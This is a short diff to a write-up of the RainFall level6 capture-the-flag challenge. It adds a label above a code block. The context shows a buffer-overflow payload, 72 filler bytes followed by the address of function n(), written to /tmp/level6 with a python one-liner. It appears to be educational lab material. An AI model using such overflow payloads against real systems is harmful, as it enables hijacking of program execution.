@@ -192,6 +192,7 @@ The `n()` function is located at the address `0x8048454`. To properly inject thi
 ```
 
 ### Final command
+The final command is :
 ```bash
 The final command is :
 level6@RainFall:~$ python -c "print('a' * 72 + '\x54\x84\x04\x08')" > /tmp/level6
